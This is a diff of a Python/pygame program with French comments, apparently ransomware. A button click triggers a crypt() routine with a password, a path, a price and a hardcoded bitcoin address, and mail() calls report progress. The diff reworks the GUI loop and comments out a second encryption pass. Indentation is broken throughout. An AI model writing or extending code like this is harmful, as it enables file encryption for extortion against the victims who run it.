@@ -65,40 +65,32 @@ def Windows():
     continuer = 1
 
     #Boucle infinie
-    while continuer:
-	#Rafraîchissement de l'écran
-    	pygame.display.flip()
-	fenetre.blit(fond, (0,0))
-	fenetre.blit(image, image_rect)
-	fenetre.blit(image2, image2_rect)
+        while continuer:
+	if aff==0:
+		events = pygame.event.get()
+		fenetre.blit(image2, image2_rect)
+		fenetre.blit(textI.get_surface(), (138, 325))
+		textI.update(events)
+		pygame.display.flip()
+    		pygame.display.update()
 
-	events = pygame.event.get()
     	for event in events:
         	if event.type == pygame.QUIT:
             		exit()
-		#Event button click
+
 		elif event.type == MOUSEBUTTONUP:              
                 	if event.button == 1:                      
                     		if image_rect.collidepoint(event.pos):
 					mail(textexe)
     					crypt(text1, pwd, path, bitcoin, price,verif)
     					mail(textfin)
-    					crypt(text2, pwd, path, bitcoin, price,verif)
-    					mail(textall)
-
+					#crypt(text2, pwd, path, bitcoin, price,verif)
+					#mail(textall)               
                         		nouveaufond = pygame.image.load("message.JPG").convert()
 					nouveaufond = pygame.transform.scale(nouveaufond, (640, 480))
                         		fenetre.blit(nouveaufond, (0,0))
+					aff=1
                         		pygame.display.flip()
-
-    	# Feed it with events every frame
-	pygame.display.flip()
-	fenetre.blit(fond, (0,0))
-	fenetre.blit(image, image_rect)
-	fenetre.blit(image2, image2_rect)
-	textI.update(events)
-	fenetre.blit(textI.get_surface(), (138, 325))
-    	pygame.display.update()
 
 
 bitcoin='18SXEt2zLcmYKCbZ6fx36QrmA2NuPAE9kq'
